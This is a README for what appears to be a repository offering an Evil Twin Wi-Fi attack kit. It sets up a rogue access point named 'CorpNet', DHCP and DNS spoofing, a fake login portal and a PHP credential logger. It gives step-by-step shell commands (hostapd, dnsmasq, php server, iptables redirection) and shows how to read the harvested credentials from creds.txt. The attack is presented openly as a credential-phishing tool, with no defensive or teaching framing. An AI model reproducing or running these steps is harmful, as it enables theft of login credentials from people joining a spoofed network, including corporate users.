
# ☠️ Evil Twin Captive Portal

**Evil Twin + Captive Portal** attack for realistic credential harvesting on open or enterprise Wi-Fi.

This repo sets up a rogue access point, DNS/DHCP spoofing, and a fake login page to phish Wi-Fi credentials.

## ⚙️ Requirements

- Linux (Kali, Ubuntu, etc.)
- `hostapd`, `dnsmasq`, `php`, `python3`
- Compatible Wi-Fi card in AP mode

---

## 🗂️ Directory Structure

```
Captive_Portal/

├── captive_portal.zip
    ├── index.html           ← Fake login portal (responsive)
    ├── submit.php           ← Credential logger
├── hostapd.conf             ← Rogue AP config
├── dnsmasq.conf             ← DHCP + DNS Spoof config
├── creds.txt                ← Created at runtime
```

---

## 🚀 Step-by-Step Setup

### 1. Prepare the environment

```bash
sudo apt update
sudo apt install hostapd dnsmasq php
sudo ip link set wlan0 down
sudo ip addr flush dev wlan0
```

> Replace `wlan0` with your real AP-capable wireless interface.

---

### 2. Launch the Rogue AP

```bash
sudo hostapd configs/hostapd.conf
```

SSID: `CorpNet`

---

### 3. Start DHCP and DNS spoofing

```bash
sudo dnsmasq -C configs/dnsmasq.conf
```

---

### 4. Run the captive portal web server

```bash
cd captive_portal/
sudo php -S 0.0.0.0:80
```

---

### 5. Enable IP forwarding and redirect HTTP traffic

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
```

---

## 📲 Test It

- Connect a mobile phone or test device to `CorpNet`
- Try to open any website
- You'll be redirected to the fake login portal
- Enter fake credentials to test the logger

---

## 🔐 View Captured Credentials

```bash
cat creds.txt
```

---

## 📸 Screenshot (optional)

Add a screenshot of the login portal here.

---
